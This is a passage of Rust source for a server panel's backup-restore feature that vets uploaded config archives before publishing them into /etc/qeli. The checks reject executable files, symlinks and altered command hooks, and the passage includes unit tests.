    // Exact mode: drop what the archive did not carry. Done AFTER publish, so a failure
    // during publish avoids pruning old extras, but may still replace some live files. (Р1)
    let mut pruned = String::new();
    if exact {
        let (removed, errors) = prune_absent(&archive_names, "/etc/qeli");
        pruned = format!(" Removed {removed} item(s) not present in the archive.");
        if !errors.is_empty() {
            stage_cleanup();
            return Err(RestoreFailure {
                error: format!("publishing the restored files failed: exact cleanup could not remove {} item(s): {}; recover from {bak} before restarting", errors.len(), errors.join("; ")),
                publication_started: true, rollback_snapshot: Some(bak),
            });
        }
    }
    stage_cleanup();
    prune_pre_restore_snapshots(5, Path::new(&bak));
    // Spell out which semantics actually ran. Operators reasonably read "restore" as "put
    // it back exactly as it was", and the default does NOT do that — anything created
    // after the backup survives. (S-13)
    let mode = if exact {
        "EXACT restore — files absent from the archive were deleted."
    } else {
        "This is an OVERLAY — files that exist now but are NOT in the archive were left in \
         place, so anything created after the backup survives. Re-run with `?exact=1` for a \
         true rollback."
    };
    Ok(format!(
        "restored {count} file(s) into /etc/qeli (pre-restore backup saved to {bak}).{pruned} \
         {mode} Restart the server to apply."
    ))
}

/// Reject a staged tree whose CONTENT would be unsafe to publish.
///
/// Two rules, both mirroring controls that already exist elsewhere:
///  * hooks are file-only — a restored config may not introduce or change
///    `post_up`/`post_down` (server) or `password_command` (client profile) relative to
///    what is live today. This is exactly what `PUT /config` enforces; restore was the
///    one panel path that skipped it, and it is the link that made the chain RCE.
///  * a restored server config must still pass `validate_profiles`, so a restore cannot
///    leave the worker crash-looping on a config the panel happily accepted.
///
/// Files under `/etc/qeli` that an EXISTING hook would execute.
///
/// The hook rule enforced in `vet_config_file` stops a restore introducing or changing a
/// hook COMMAND. It does nothing about the script that command points AT: if the live
/// config already has `post_up = /etc/qeli/up.sh`, an archive can ship a new `up.sh`,
/// leave the config byte-identical, and the panel has just written code that runs as root
/// on the next profile start. That is precisely the panel-compromise-to-RCE step the
/// file-only hook rule exists to prevent, so the paths are collected here and refused.
///
/// Only paths inside `/etc/qeli` matter — a hook pointing outside it is not something a
/// restore can reach (and the docs already recommend keeping hooks there).
fn hook_referenced_files(config_path: &str, retained_hooks: &[String]) -> hook_paths::HookFiles {
    let mut out = hook_paths::HookFiles::new(Path::new(MANAGED_BACKUP_ROOT));
    for command in retained_hooks {
        out.add_command(command);
    }
    // The LIVE config path, not a hard-coded one.
    //
    // This read `/etc/qeli/server.conf` literally, so a server started with
    // `-c /etc/qeli/qeli.conf` — or any other name — produced an EMPTY set and the whole
    // gate went inert, silently. `ServerState::config_path` is what every other part of the
    // server uses. (Audit 2026-08-04.)
    if let Ok(text) = crate::server::read_config_text(config_path) {
        if let Ok(cfg) = crate::config::parse_server_config(&text) {
            for p in &cfg.profiles {
                out.add_command(&p.routing.post_up);
                out.add_command(&p.routing.post_down);
            }
        }
    }
    out
}

/// Return a safe, normal-component path relative to `/etc/qeli`. Parent traversal,
/// an additional root, or a platform prefix are not archive members and are rejected.
fn qeli_relative_path(path: &str) -> Option<std::path::PathBuf> {
    let relative = std::path::Path::new(path).strip_prefix("/etc/qeli").ok()?;
    if relative.as_os_str().is_empty()
        || !relative
            .components()
            .all(|component| matches!(component, std::path::Component::Normal(_)))
    {
        None
    } else {
        Some(relative.to_path_buf())
    }
}

/// Managed dependencies must come from staging, even in overlay mode. Checking live
/// files would approve an incomplete archive and exact restore could delete the pin.
fn restore_dependency_path(
    root: &Path,
    path: &str,
    label: &str,
) -> Result<std::path::PathBuf, String> {
    let path_ref = Path::new(path);
    if !path_ref.is_absolute() {
        return Err(format!(
            "refused: restored {label} path '{path}' must be absolute"
        ));
    }
    if path_ref.strip_prefix(MANAGED_BACKUP_ROOT).is_ok() {
        let relative = qeli_relative_path(path)
            .ok_or_else(|| format!("refused: unsafe restored {label} path '{path}'"))?;
        Ok(root.join(relative))
    } else {
        Ok(path_ref.to_path_buf())
    }
}

fn vet_restored_runtime_files(
    root: &Path,
    config: &crate::config::server::ServerConfig,
) -> Result<(), String> {
    use std::io::Read;
    for profile in &config.profiles {
        let label = format!("identity key for profile '{}'", profile.name);
        let path =
            restore_dependency_path(root, &crate::server::profile_identity_path(profile), &label)?;
        let mut options = std::fs::OpenOptions::new();
        options.read(true);
        #[cfg(unix)]
        {
            use std::os::unix::fs::OpenOptionsExt;
            options.custom_flags(libc::O_NONBLOCK | libc::O_CLOEXEC);
        }
        let file = options.open(&path).map_err(|error| {
            format!(
                "refused: restored {label} '{}' is unavailable: {error}",
                path.display()
            )
        })?;
        let metadata = file
            .metadata()
            .map_err(|error| format!("refused: inspect restored {label}: {error}"))?;
        if !metadata.is_file() || metadata.len() != 32 {
            return Err(format!(
                "refused: restored {label} must be a regular 32-byte file"
            ));
        }
        let mut bytes = Vec::new();
        file.take(33)
            .read_to_end(&mut bytes)
            .map_err(|error| format!("refused: read restored {label}: {error}"))?;
        if bytes.len() != 32 {
            return Err(format!(
                "refused: restored {label} changed length while reading"
            ));
        }
    }
    if config.web.enabled && config.web.tls {
        let mut web = config.web.clone();
        for (path, default, label) in [
            (
                &mut web.tls_cert,
                "/etc/qeli/web-tls-cert.pem",
                "panel TLS certificate",
            ),
            (
                &mut web.tls_key,
                "/etc/qeli/web-tls-key.pem",
                "panel TLS private key",
            ),
        ] {
            let resolved =
                restore_dependency_path(root, if path.is_empty() { default } else { path }, label)?;
            *path = resolved.to_string_lossy().into_owned();
        }
        // Explicit staged paths require an existing, matching PEM pair. Never generate
        // a new panel identity to mask missing files in the uploaded backup.
        crate::server::web::tls::check_config_files(&web)
            .map_err(|error| format!("refused: restored panel TLS material is invalid: {error}"))?;
    }
    Ok(())
}

fn vet_hook_pruning(
    archive_names: &std::collections::HashSet<String>,
    live_root: &Path,
    hooks: &hook_paths::HookFiles,
) -> Result<(), String> {
    for entry in std::fs::read_dir(live_root).map_err(|e| format!("live tree unreadable: {e}"))? {
        let entry = entry.map_err(|e| format!("live tree unreadable: {e}"))?;
        let name = entry.file_name().to_string_lossy().into_owned();
        if hooks.contains(&name) && !archive_names.contains(&name) {
            return Err(format!("refused: exact restore would delete '{name}' referenced by a live or retained routing hook; keep hooks outside /etc/qeli"));
        }
    }
    Ok(())
}

#[cfg(test)]
fn vet_staged_tree(root: &str, config_path: &str) -> Result<(), String> {
    vet_staged_tree_with_hooks(root, config_path, &[])
}

fn vet_staged_tree_with_hooks(
    root: &str,
    config_path: &str,
    retained_hooks: &[String],
) -> Result<(), String> {
    // The live server accepts an arbitrary config filename.  Validate that exact
    // staged path as a server config even when it is `server.ini`/`qeli.cfg`; an
    // extension-based gate is not a security boundary.
    let config_is_under_qeli = std::path::Path::new(config_path)
        .strip_prefix("/etc/qeli")
        .is_ok();
    if config_is_under_qeli && qeli_relative_path(config_path).is_none() {
        return Err(format!(
            "refused: active server config path '{config_path}' is not a normal path below /etc/qeli"
        ));
    }
    if let Some(relative) = qeli_relative_path(config_path) {
        let staged_path = std::path::Path::new(root).join(&relative);
        if staged_path.is_file() {
            let staged = crate::server::read_config_text(&staged_path)
                .map_err(|e| format!("cannot read staged '{}': {e}", relative.display()))?;
            let live = read_live_config_for_restore(&staged, std::path::Path::new(config_path))?;
            vet_server_config(&relative.to_string_lossy(), &staged, &live)?;

            // The restored main config is authoritative. Runtime merges its external users
            // database with inline users/groups, so the external dependency is mandatory even
            // when inline entries exist. Otherwise restore silently loses part of the ACL.
            let staged_config = crate::config::parse_server_config(&staged).map_err(|e| {
                format!(
                    "refused: active server config '{}' could not be parsed after validation: {e}",
                    relative.display()
                )
            })?;
            let users_claims_qeli = std::path::Path::new(&staged_config.auth.users_file)
                .strip_prefix("/etc/qeli")
                .is_ok();
            if users_claims_qeli && qeli_relative_path(&staged_config.auth.users_file).is_none() {
                return Err(format!(
                    "refused: active server config '{}' contains unsafe users_file path '{}'",
                    relative.display(),
                    staged_config.auth.users_file
                ));
            }
            let users = if let Some(users_relative) =
                qeli_relative_path(&staged_config.auth.users_file)
            {
                let users_path = std::path::Path::new(root).join(&users_relative);
                if users_path.is_file() {
                    let content = std::fs::read_to_string(&users_path).map_err(|e| {
                        format!(
                            "cannot read staged users database '{}': {e}",
                            users_relative.display()
                        )
                    })?;
                    crate::config::users::UsersDb::parse_strict(&content, &users_relative).map_err(
                        |e| {
                            format!(
                                "refused: users database '{}' is invalid: {e}",
                                users_relative.display()
                            )
                        },
                    )?
                } else {
                    return Err(format!(
                        "refused: active server config '{}' requires users database '{}', but the archive does not contain it",
                        relative.display(),
                        users_relative.display()
                    ));
                }
            } else {
                // Restore cannot replace a users file outside /etc/qeli, but a newly
                // restored main config can start referring to one. Validate the actual
                // dependency now; load_users_db refuses an existing corrupt file even
                // when inline users are also present.
                match crate::config::users::UsersDb::load(&staged_config.auth.users_file) {
                    Ok(users) => users,
                    Err(error) => {
                        return Err(format!(
                            "refused: active server config '{}' refers to unusable users database '{}': {error}",
                            relative.display(),
                            staged_config.auth.users_file
                        ));
                    }
                }
            };
            crate::server::effective_users_from_external(&staged_config, users).map_err(
                |error| format!("refused: restored config/users are incompatible: {error}"),
            )?;
            vet_restored_runtime_files(Path::new(root), &staged_config)?;
        } else {
            return Err(format!(
                "refused: archive does not contain the active server config '{}'",
                relative.display()
            ));
        }
    }
    // A restored config tree must not reintroduce the retired JSON notification sidecar.
    let legacy_notify = std::path::Path::new(root).join("notify.json");
    if legacy_notify
        .try_exists()
        .map_err(|error| format!("staged tree unreadable: {error}"))?
    {
        return Err(
            "refused: archive contains notify.json; convert notification settings to notify.ini before restoring"
                .into(),
        );
    }
    // Validate notification settings before publishing the staged tree.
    crate::config::notify::load_path(&std::path::Path::new(root).join("notify.ini"))
        .map_err(|error| format!("refused: restored notification config is invalid: {error}"))?;
    let hook_files = hook_referenced_files(config_path, retained_hooks);
    vet_staged_dir(
        std::path::Path::new(root),
        std::path::Path::new("/etc/qeli"),
        &hook_files,
    )
}

#[cfg(unix)]
fn normalize_staged_permissions(root: &std::path::Path) -> std::io::Result<()> {
    use std::os::unix::fs::PermissionsExt;

    for entry in std::fs::read_dir(root)? {
        let entry = entry?;
        let path = entry.path();
        let metadata = entry.metadata()?;
        if metadata.is_dir() {
            normalize_staged_permissions(&path)?;
        } else {
            std::fs::set_permissions(&path, std::fs::Permissions::from_mode(0o600))?;
        }
    }
    std::fs::set_permissions(root, std::fs::Permissions::from_mode(0o700))
}

#[cfg(not(unix))]
fn normalize_staged_permissions(_root: &std::path::Path) -> std::io::Result<()> {
    Ok(())
}
fn vet_staged_dir(
    root: &std::path::Path,
    live_root: &std::path::Path,
    hook_files: &hook_paths::HookFiles,
) -> Result<(), String> {
    let entries = std::fs::read_dir(root).map_err(|e| format!("staged tree unreadable: {e}"))?;
    for entry in entries {
        let entry = entry.map_err(|error| format!("cannot inspect staged entry: {error}"))?;
        let path = entry.path();
        let name = entry.file_name().to_string_lossy().into_owned();
        if name == ".config-history"
            || name.starts_with(".pre-restore-")
            || name.starts_with(".restore-upload-")
            || name.starts_with(".restore-staging-")
        {
            return Err(format!(
                "refused: archive contains local operational state '{name}'"
            ));
        }
        // Refuse to replace a file an existing hook executes — see hook_referenced_files.
        if hook_files.contains(&name) {
            return Err(format!(
                "refused: '{name}' is executed by a routing.post_up/post_down hook in a live or retained                  worker configuration. Replacing it through a restore would run panel-supplied code as root,                  which the file-only hook rule exists to prevent. Update it on the server, or                  point the hook outside /etc/qeli."
            ));
        }
        let md = match entry.metadata() {
            Ok(m) => m,
            Err(e) => return Err(format!("cannot stat staged '{name}': {e}")),
        };
        if md.is_dir() {
            // identity/ and friends: recurse, same rules.
            vet_staged_dir(&path, &live_root.join(&name), hook_files)?;
            continue;
        }
        #[cfg(unix)]
        {
            use std::os::unix::fs::PermissionsExt;
            if md.permissions().mode() & 0o111 != 0 {
                return Err(format!(
                    "refused: '{name}' is executable — a qeli backup holds configs and keys, \
                     never programs"
                ));
            }
        }
        if !name.ends_with(".conf") && !name.ends_with(".ini") {
            continue; // keys, usage.json, … carry no executable semantics
        }
        if name == "notify.ini" {
            continue;
        }
        let text = match std::fs::read_to_string(&path) {
            Ok(t) => t,
            Err(e) => return Err(format!("cannot read staged '{name}': {e}")),
        };
        let live_path = live_root.join(&name);
        let live = read_live_config_for_restore(&text, &live_path)?;
        vet_config_file(&name, &text, &live)?;
    }
    Ok(())
}

/// Restoring a file with an unchanged hook still changes its trust: the staged
/// file is normalized to mode 0600. The live command must have come from a
/// trusted inode, or a writable/symlinked live config could authorize itself.
fn read_live_config_for_restore(
    staged: &str,
    live_path: &std::path::Path,
) -> Result<String, String> {
    let server_commands = crate::config::parse_server_config(staged).is_ok_and(|config| {
        config.profiles.iter().any(|profile| {
            !profile.routing.post_up.is_empty() || !profile.routing.post_down.is_empty()
        })
    });
    let client_commands = crate::config::parse_client_config_strict(staged).is_ok_and(|config| {
        config
            .auth
            .password_command
            .as_deref()
            .is_some_and(|cmd| !cmd.is_empty())
            || !config.routing.post_up.is_empty()
            || !config.routing.post_down.is_empty()
    });
    if !server_commands && !client_commands {
        // The live file only authorizes unchanged commands. Without staged
        // commands, even a corrupt or missing live config can be repaired.
        return Ok(String::new());
    }
    let source = match crate::server::read_config_source(live_path) {
        Ok(source) => source,
        // The existing hook-diff check rejects a command with no live counterpart
        // and gives the operator the more useful post_up/password_command error.
        Err(error) if error.kind() == std::io::ErrorKind::NotFound => return Ok(String::new()),
        Err(error) => {
            return Err(format!(
                "refused: cannot trust live command source '{}': {error}",
                live_path.display()
            ))
        }
    };
    source
        .require_trusted_file_output("restoring unchanged config commands")
        .map_err(|error| format!("refused: {error}"))?;
    Ok(source.text().to_owned())
}

/// Apply the hook/validation rules to one staged `.conf`, given the file it would
/// replace (empty when it is a new file).
fn vet_server_config(name: &str, staged: &str, live: &str) -> Result<(), String> {
    if staged.len() as u64 > crate::server::MAX_SERVER_INI_BYTES {
        return Err(format!(
            "refused: server config '{name}' is {} bytes; maximum is {}",
            staged.len(),
            crate::server::MAX_SERVER_INI_BYTES
        ));
    }
    let (config, findings) = crate::config::parse_server_config_reporting(staged)
        .map_err(|e| format!("refused: server config '{name}' is invalid: {e}"))?;
    if !findings.is_empty() {
        return Err(format!(
            "refused: server config '{name}' contains unsupported or unreadable settings: {}",
            findings.join("; ")
        ));
    }
    let live_config = crate::config::parse_server_config(live).ok();
    for profile in &config.profiles {
        if profile.routing.post_up.is_empty() && profile.routing.post_down.is_empty() {
            continue;
        }
        let unchanged = live_config
            .as_ref()
            .and_then(|current| {
                current
                    .profiles
                    .iter()
                    .find(|candidate| candidate.name == profile.name)
            })
            .is_some_and(|current| {
                current.routing.post_up == profile.routing.post_up
                    && current.routing.post_down == profile.routing.post_down
            });
        if !unchanged {
            return Err(format!(
                "refused: '{name}' profile '{}' introduces or changes routing.post_up/post_down",
                profile.name
            ));
        }
    }
    crate::server::validate_profiles(&config)
        .map_err(|e| format!("refused: '{name}' would not start: {e}"))?;
    crate::config::users::UsersDb {
        users: config.auth.users.clone(),
        groups: config.auth.groups.clone(),
    }
    .validate_access_controls()
    .map_err(|e| format!("refused: '{name}' has invalid inline access controls: {e}"))?;
    Ok(())
}

fn vet_config_file(name: &str, staged: &str, live: &str) -> Result<(), String> {
    if staged
        .lines()
        .map(str::trim)
        .any(|line| line.starts_with("[user:") || line.starts_with("[group:"))
        && !staged
            .lines()
            .map(str::trim)
            .any(|line| line.starts_with("[profile:"))
    {
        return crate::config::users::UsersDb::parse_strict(staged, name)
            .map(|_| ())
            .map_err(|e| format!("refused: users database '{name}' is invalid: {e}"));
    }
    if crate::config::parse_server_config(staged).is_ok_and(|config| !config.profiles.is_empty()) {
        return vet_server_config(name, staged, live);
    }
    // An empty users database is valid and intentionally has no `[user:*]`
    // marker. Accept any file whose complete key set is consumed by UsersDb.
    if crate::config::users::UsersDb::parse_strict(staged, name).is_ok() {
        return Ok(());
    }
    // Otherwise treat it as a client profile.
    if let Ok(c) = crate::config::parse_client_config_strict(staged) {
        let live_c = crate::config::parse_client_config(live).ok();
        let staged_hooks = (
            c.auth.password_command.clone().unwrap_or_default(),
            c.routing.post_up.clone(),
            c.routing.post_down.clone(),
        );
        if !staged_hooks.0.is_empty() || !staged_hooks.1.is_empty() || !staged_hooks.2.is_empty() {
            let unchanged = live_c.is_some_and(|l| {
                l.auth.password_command.as_deref().unwrap_or_default() == staged_hooks.0.as_str()
                    && l.routing.post_up == staged_hooks.1
                    && l.routing.post_down == staged_hooks.2
            });
            if !unchanged {
                return Err(format!(
                    "refused: client profile '{name}' sets password_command/post_up/post_down, \
                     which execute commands on whoever imports it. These cannot be introduced \
                     through the panel."
                ));
            }
        }
        return Ok(());
    }
    Err(format!(
        "refused: '{name}' is a .conf file but is not a valid qeli server, client or users config"
    ))
}

/// Prove that publishing cannot walk through a live symlink or fail halfway on
/// a file/directory type mismatch. In exact mode, the current top-level pruner
/// can remove an entire absent directory, but it deliberately does not recurse
/// into directories present in both trees. Refuse nested extras instead of
/// claiming an exact restore while silently retaining them.
fn vet_publish_shape(
    staged: &std::path::Path,
    live: &std::path::Path,
    exact: bool,
    depth: usize,
) -> Result<(), String> {
    let live_root_meta = match std::fs::symlink_metadata(live) {
        Ok(metadata) => Some(metadata),
        Err(error) if error.kind() == std::io::ErrorKind::NotFound => None,
        Err(error) => return Err(format!("cannot inspect live restore target: {error}")),
    };
    if live_root_meta
        .as_ref()
        .is_some_and(|metadata| metadata.file_type().is_symlink())
    {
        return Err(format!(
            "refused: live restore target '{}' is a symlink",
            live.display()
        ));
    }

    let entries = std::fs::read_dir(staged)
        .map_err(|error| format!("staged tree unreadable during publish check: {error}"))?;
    for entry in entries {
        let entry = entry.map_err(|error| format!("cannot inspect staged entry: {error}"))?;
        let staged_path = entry.path();
        let live_path = live.join(entry.file_name());
        let staged_meta = std::fs::symlink_metadata(&staged_path).map_err(|error| {
            format!("cannot inspect staged '{}': {error}", staged_path.display())
        })?;
        let live_meta = match std::fs::symlink_metadata(&live_path) {
            Ok(metadata) => Some(metadata),
            Err(error) if error.kind() == std::io::ErrorKind::NotFound => None,
            Err(error) => {
                return Err(format!(
                    "cannot inspect live restore target '{}': {error}",
                    live_path.display()
                ))
            }
        };
        if live_meta
            .as_ref()
            .is_some_and(|metadata| metadata.file_type().is_symlink())
        {
            return Err(format!(
                "refused: live restore target '{}' is a symlink",
                live_path.display()
            ));
        }
        if let Some(live_meta) = &live_meta {
            if staged_meta.is_dir() != live_meta.is_dir() {
                return Err(format!(
                    "refused: staged/live type mismatch at '{}'",
                    live_path.display()
                ));
            }
        }
        if staged_meta.is_dir() && live_meta.is_some() {
            vet_publish_shape(&staged_path, &live_path, exact, depth + 1)?;
        }
    }

    if exact && depth > 0 && live_root_meta.is_some() {
        let live_entries = std::fs::read_dir(live)
            .map_err(|error| format!("cannot scan live directory '{}': {error}", live.display()))?;
        for entry in live_entries {
            let entry = entry.map_err(|error| format!("cannot inspect live entry: {error}"))?;
            let name = entry.file_name();
            if name.to_string_lossy().starts_with('.') || name.to_string_lossy().ends_with(".lock")
            {
                continue;
            }
            if !staged.join(&name).exists() {
                return Err(format!(
                    "refused: exact restore would leave nested live entry '{}' that is absent from the archive; remove it explicitly first",
                    live.join(name).display()
                ));
            }
        }
    }
    Ok(())
}

/// Move every staged file into `dest`, creating directories as needed. Same
/// filesystem, so each `rename` is atomic.
fn publish_staged_tree(root: &str, dest: &str) -> std::io::Result<()> {
    std::fs::create_dir_all(dest)?;
    for entry in std::fs::read_dir(root)? {
        let entry = entry?;
        // A restored lock inode would split flock participants across two files
        // while a save or restore is in progress. Locks are operational state.
        if entry.file_name().to_string_lossy().ends_with(".lock") {
            continue;
        }
        let from = entry.path();
        let to = format!("{dest}/{}", entry.file_name().to_string_lossy());
        if entry.metadata()?.is_dir() {
            publish_staged_tree(&from.to_string_lossy(), &to)?;
        } else {
            std::fs::rename(&from, &to)?;
        }
    }
    Ok(())
}

/// Keep only the `keep` newest `.pre-restore-*.tgz` snapshots in /etc/qeli so
/// repeated restores don't grow the config dir without bound. The timestamp is
/// measured from file modification time. Sequence digits and PID are not chronology;
/// never rotate the snapshot referenced by the current successful response.
fn prune_pre_restore_snapshots(keep: usize, preserve: &Path) {
    let scan = (|| -> std::io::Result<Vec<_>> {
        let mut snaps = Vec::new();
        for entry in std::fs::read_dir("/etc/qeli")? {
            let entry = entry?;
            let name = entry.file_name();
            let Some(name) = name.to_str() else {
                continue;
            };
            if !name.starts_with(".pre-restore-") || !name.ends_with(".tgz") {
                continue;
            }
            let metadata = entry.metadata()?;
            if metadata.is_file() {
                snaps.push((metadata.modified()?, entry.path()));
            }
        }
        Ok(snaps)
    })();
    let Ok(mut snaps) = scan else {
        return;
    };
    if snaps.len() <= keep {
        return;
    }
    snaps.sort();
    let mut remaining = snaps.len();
    for (_, path) in snaps {
        if remaining <= keep {
            break;
        }
        if path != preserve && std::fs::remove_file(path).is_ok() {
            remaining -= 1;
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn oversized_server_ini_is_rejected_before_restore_publication() {
        let oversized = "#".repeat(crate::server::MAX_SERVER_INI_BYTES as usize + 1);
        let error = vet_server_config("server.conf", &oversized, "").unwrap_err();
        assert!(error.contains("maximum is 16777216"));
    }

    #[test]
    fn restore_rejects_legacy_notification_json_before_publication() {
        let dir = std::env::temp_dir().join(format!(
            "qeli-restore-notify-json-{}-{}",
            std::process::id(),
            rand::random::<u64>()
        ));
        std::fs::create_dir_all(&dir).unwrap();
        std::fs::write(dir.join("server.ini"), srv("")).unwrap();
        std::fs::write(dir.join("users.conf"), "").unwrap();
        std::fs::create_dir_all(dir.join("identity")).unwrap();
        std::fs::write(dir.join("identity/p.key"), [7u8; 32]).unwrap();
        std::fs::write(dir.join("notify.json"), "{}").unwrap();
        let error = vet_staged_tree(dir.to_str().unwrap(), "/etc/qeli/server.ini").unwrap_err();
        assert!(error.contains("archive contains notify.json"), "{error}");
        std::fs::remove_dir_all(dir).unwrap();
    }
    #[test]
    fn staged_users_are_validated_against_inline_groups_and_reservations() {
        let dir = std::env::temp_dir().join(format!("qeli-restore-union-{}", std::process::id()));
        std::fs::create_dir_all(&dir).unwrap();
        let server = dir.join("server.ini");
        let users = dir.join("users.conf");
        std::fs::write(&server, srv("")).unwrap();
        std::fs::create_dir_all(dir.join("identity")).unwrap();
        std::fs::write(dir.join("identity/p.key"), [7u8; 32]).unwrap();
        std::fs::write(&users, "[user:alice]\npassword_hash=fixture\ngroup=staff\n").unwrap();
        let error = vet_staged_tree(dir.to_str().unwrap(), "/etc/qeli/server.ini").unwrap_err();
        assert!(error.contains("group 'staff' does not exist"), "{error}");
        std::fs::write(
            &server,
            format!("{}\n[group:staff]\nmax_sessions=2\n", srv("")),
        )
        .unwrap();
        assert!(vet_staged_tree(dir.to_str().unwrap(), "/etc/qeli/server.ini").is_ok());
        std::fs::write(&server, srv("pool.reservation.bob=10.0.0.9\n")).unwrap();
        std::fs::write(
            &users,
            "[user:alice]\npassword_hash=fixture\nstatic_ip=10.0.0.9\n",
        )
        .unwrap();
        let error = vet_staged_tree(dir.to_str().unwrap(), "/etc/qeli/server.ini").unwrap_err();
        assert!(error.contains("incompatible"), "{error}");
        std::fs::remove_dir_all(dir).unwrap();
    }

    #[test]
    fn backup_reads_current_configuration_from_the_actual_archive() {
        let dir = std::env::temp_dir().join(format!("qeli-backup-current-{}", std::process::id()));
        let inner = dir.join("qeli");
        std::fs::create_dir_all(&inner).unwrap();
        let raw = format!(
            "[auth]\nusers_file=/etc/qeli/current-users.conf\n{}",
            srv("identity_key=/etc/qeli/current.key\n")
        );
        std::fs::write(inner.join("server.conf"), &raw).unwrap();
        let archive = std::process::Command::new("tar")
            .args(["czf", "-", "-C"])
            .arg(&dir)
            .arg("qeli")
            .output()
            .unwrap();
        assert!(archive.status.success());
        let (bytes, members) =
            inspect_backup_archive(archive.stdout, Instant::now() + ARCHIVE_BUDGET).unwrap();
        let (_, archived) =
            read_backup_member(bytes, "qeli/server.conf", Instant::now() + ARCHIVE_BUDGET).unwrap();
        assert_eq!(archived, raw);
        let config = crate::config::parse_server_config(&archived).unwrap();
        let required = critical_backup_paths(&config, "/etc/qeli/server.conf").unwrap();
        assert!(required
            .iter()
            .any(|path| path.archive_path == "qeli/current-users.conf"));
        assert!(required
            .iter()
            .any(|path| path.archive_path == "qeli/current.key"));
        assert!(required
            .iter()
            .any(|path| !members.contains(&path.archive_path)));
        std::fs::remove_dir_all(dir).unwrap();
    }

    #[test]
    fn backup_only_requires_tls_material_for_an_active_https_panel() {
        let mut config = crate::config::server::ServerConfig::default();
        config.auth.users_file = "/etc/qeli/users.conf".into();
        config.web.enabled = false;
        config.web.tls = true;
        config.web.tls_cert = "/etc/letsencrypt/live/example/fullchain.pem".into();
        config.web.tls_key = "/etc/letsencrypt/live/example/privkey.pem".into();
        let paths = critical_backup_paths(&config, "/etc/qeli/server.conf").unwrap();
        assert!(!paths
            .iter()
            .any(|path| path.reason == "the active panel TLS material"));

        config.web.enabled = true;
        let error = critical_backup_paths(&config, "/etc/qeli/server.conf").unwrap_err();
        assert!(error.contains("outside /etc/qeli"), "{error}");
        config.web.tls_cert = "/etc/qeli/cert.pem".into();
        config.web.tls_key = "/etc/qeli/key.pem".into();
        let paths = critical_backup_paths(&config, "/etc/qeli/server.conf").unwrap();
        assert!(paths
            .iter()
            .any(|path| path.archive_path == "qeli/cert.pem"));
        assert!(paths.iter().any(|path| path.archive_path == "qeli/key.pem"));
    }

    #[test]
    fn panel_backup_accepts_custom_managed_paths() {
        let mut config = crate::config::server::ServerConfig::default();
        config.auth.users_file = "/etc/qeli/auth/custom-users.ini".into();
        config.auth.users.push(Default::default());
        let profile = crate::config::server::ProfileConfig {
            name: "tcp".into(),
            identity_key: Some("/etc/qeli/keys/tcp.key".into()),
            ..Default::default()
        };
        config.profiles.push(profile);
        let paths = critical_backup_paths(&config, "/etc/qeli/config/server.ini").unwrap();
        let names: Vec<&str> = paths
            .iter()
            .map(|path| path.archive_path.as_str())
            .collect();
        assert!(names.contains(&"qeli/config/server.ini"));
        assert!(names.contains(&"qeli/auth/custom-users.ini"));
        assert!(names.contains(&"qeli/keys/tcp.key"));
    }

    #[test]
    #[ignore = "requires root, a fresh mount/network namespace and existing /etc/qeli mount point"]
    fn native_backup_and_overlay_exact_restore_roundtrip() {
        use std::os::unix::fs::{MetadataExt, PermissionsExt};
        let original = std::fs::metadata("/etc/qeli").unwrap();
        let original_namespace = std::fs::metadata("/proc/thread-self/ns/mnt").unwrap();
        assert_eq!(unsafe { libc::geteuid() }, 0);
        let root = std::path::PathBuf::from(format!(
            "/tmp/qeli-backup-roundtrip-{}-{}",
            std::process::id(),
            rand::random::<u64>()
        ));
        std::fs::create_dir(&root).unwrap();
        struct Cleanup(std::path::PathBuf);
        impl Drop for Cleanup {
            fn drop(&mut self) {
                let _ = std::fs::remove_dir_all(&self.0);
            }
        }
        let _cleanup = Cleanup(root.clone());
        let private = root.join("qeli");
        std::fs::create_dir(&private).unwrap();
        std::fs::set_permissions(&private, std::fs::Permissions::from_mode(0o700)).unwrap();
        std::thread::spawn(move || {
            assert_eq!(unsafe { libc::unshare(libc::CLONE_NEWNS | libc::CLONE_NEWNET) }, 0, "{}", std::io::Error::last_os_error());
            let namespace = std::fs::metadata("/proc/thread-self/ns/mnt").unwrap();
            assert_ne!((namespace.dev(), namespace.ino()), (original_namespace.dev(), original_namespace.ino()));
            assert!(crate::system_command::Command::new("mount").args(["--make-rprivate", "/"]).output().unwrap().status.success());
            assert!(crate::system_command::Command::new("mount").args(["--bind", private.to_str().unwrap(), "/etc/qeli"]).output().unwrap().status.success());
            let mounted = std::fs::metadata("/etc/qeli").unwrap();
            let source = std::fs::metadata(&private).unwrap();
            assert_eq!((mounted.dev(), mounted.ino()), (source.dev(), source.ino()));
            let raw = "[auth]\nusers_file=/etc/qeli/users.conf\n[web]\nenabled=false\ntls=false\n[profile:test]\nidentity_key=/etc/qeli/test.key\nbind.port=443\ntun.name=vpn0\ntun.address=10.73.0.1\npool.cidr=10.73.0.0/24\nobf.mode=fake-tls\n";
            let config = crate::config::parse_server_config(raw).unwrap();
            crate::server::validate_profiles(&config).unwrap();
            std::fs::write("/etc/qeli/server.conf", raw).unwrap();
            std::fs::write("/etc/qeli/users.conf", "").unwrap();
            std::fs::write("/etc/qeli/test.key", [42u8; 32]).unwrap();
            let state = crate::server::test_api_state(config, Path::new("/etc/qeli/server.conf"));
            tokio::runtime::Builder::new_current_thread().enable_all().build().unwrap().block_on(async {
                let response = download_backup(axum::extract::State(state.clone()), auth::AuthGuard).await.unwrap();
                assert_eq!(response.status(), StatusCode::OK);
                let bytes = axum::body::to_bytes(response.into_body(), PORTABLE_ARCHIVE_LIMIT).await.unwrap();
                std::fs::write("/etc/qeli/server.conf", raw.replace("443", "8443")).unwrap();
                std::fs::write("/etc/qeli/added.txt", "overlay keeps this").unwrap();
                for exact in [false, true] {
                    let response = restore_backup(axum::extract::State(state.clone()), auth::AuthGuard,
                        axum::extract::Query(RestoreQuery { exact: Some(exact) }), bytes.clone()).await.unwrap();
                    let status = response.status();
                    let result = axum::body::to_bytes(response.into_body(), 64 * 1024).await.unwrap();
                    assert_eq!(status, StatusCode::OK, "{}", String::from_utf8_lossy(&result));
                    assert_eq!(std::fs::read_to_string("/etc/qeli/server.conf").unwrap(), raw);
                    assert_eq!(Path::new("/etc/qeli/added.txt").exists(), !exact);
                    assert_eq!(std::fs::read("/etc/qeli/test.key").unwrap(), [42; 32]);
                }
                let response = restore_backup(axum::extract::State(state), auth::AuthGuard,
                    axum::extract::Query(RestoreQuery { exact: Some(true) }), Bytes::from_static(b"invalid archive")).await.unwrap();
                assert_eq!(response.status(), StatusCode::BAD_REQUEST);
